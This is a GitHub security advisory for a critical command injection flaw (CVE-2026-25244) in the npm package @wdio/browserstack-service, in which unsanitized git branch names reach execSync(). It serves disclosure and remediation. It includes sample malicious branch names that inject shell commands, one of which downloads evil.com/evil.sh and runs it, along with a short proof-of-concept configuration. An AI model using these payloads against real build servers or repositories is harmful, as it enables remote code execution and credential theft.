# [C] WebdriverIO BrowserStack Service has a Command Injection issue

## Summary
Severity: Critical
Advisory: GHSA-5c46-x3qw-q7j7
CVE: CVE-2026-25244
CWE: CWE-78
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-05-11
Source: https://github.com/advisories/GHSA-5c46-x3qw-q7j7
Type: github-advisory

## Affected
- npm: `@wdio/browserstack-service` — affected >=0 <9.24.0

## Details
### Summary
A command injection vulnerability exists in `@wdio/browserstack-service` that allows remote code execution (RCE) when processing git branch names in test orchestration. An attacker can exploit this by providing a malicious git repository with a branch name containing shell command injection payloads.

### Details
_Give all details on the vulnerability. Pointing to the incriminated source code is very helpful for the maintainer._

### Vulnerable Code
**File**:  https://github.com/webdriverio/webdriverio/blob/ea0e3e00288abced4c739ff9e46c46977b7cdbd2/packages/wdio-browserstack-service/src/testorchestration/helpers.ts#L204

### Root Cause
User-controlled git branch names are directly interpolated into `execSync()` calls without sanitization. Git allows branch names to contain special characters ,that can be used for command injection.
Git allows to create these branches.
```
git checkout -b "main;touch\${IFS}/tmp/pwned.txt;echo\${IFS}PWNED"
git checkout -b "main;rm\${IFS}/tmp/pwned.txt;echo\${IFS}PWNED"
git checkout -b "main;curl\${IFS}evil.com/evil.sh\${IFS}>/tmp/evil.sh;bash\${IFS}/tmp/evil.sh;echo\${IFS}PWNED"
```


### Attack Vector
1. Attacker creates a malicious git repository with a branch name containing command injection payload
2. Attacker configures WebdriverIO to use this repository via `testOrchestrationOptions.runSmartSelection.source`. if `source` is not provided it takes current directory as `source`.
3. When `getGitMetadataForAISelection()` executes, it extracts the malicious branch name
4. Branch name is interpolated into shell commands without sanitization
5. Shell interprets special characters and executes attacker's commands

### PoC
### Step 1: Create Malicious Repository Branch
```
git checkout -b "main;touch\${IFS}/tmp/pwned.txt;echo\${IFS}PWNED"
```

### Step 2: Configure WebdriverIO

```javascript
// wdio.conf.js
export const config = {
    services: [
        ['browserstack', {
            user: process.env.BROWSERSTACK_USERNAME,
            key: process.env.BROWSERSTACK_ACCESS_KEY,
            testOrchestrationOptions: {
                runSmartSelection: {
                    enabled: true,
                    source: ['/tmp/malicious-repo']  // ⚠️ Points to malicious repo, without "source" field, it runs in the current directory.
                }
            }
        }]
    ],
    // ... rest of config
}
```
### Step 3: Run Tests

```bash
npm run wdio
```
### Step 4: Verify RCE

```bash
# Check if file was created (proof of RCE)
ls -la /tmp/pwned.txt
```

### Impact

- **Remote Code Execution** on CI/CD servers or developer machines
- **Information Disclosure** (environment variables, secrets, credentials)
- **Data Exfiltration** (source code, SSH keys, configuration files)
- **System Compromise** (backdoor installation, lateral movement)
- **Supply Chain Attack** (modify build artifacts)

## References
- https://github.com/webdriverio/webdriverio/security/advisories/GHSA-5c46-x3qw-q7j7
- https://nvd.nist.gov/vuln/detail/CVE-2026-25244
- https://github.com/webdriverio/webdriverio
- https://github.com/webdriverio/webdriverio/blob/ea0e3e00288abced4c739ff9e46c46977b7cdbd2/packages/wdio-browserstack-service/src/testorchestration/helpers.ts#L204
- https://github.com/webdriverio/webdriverio/releases/tag/v9.24.0
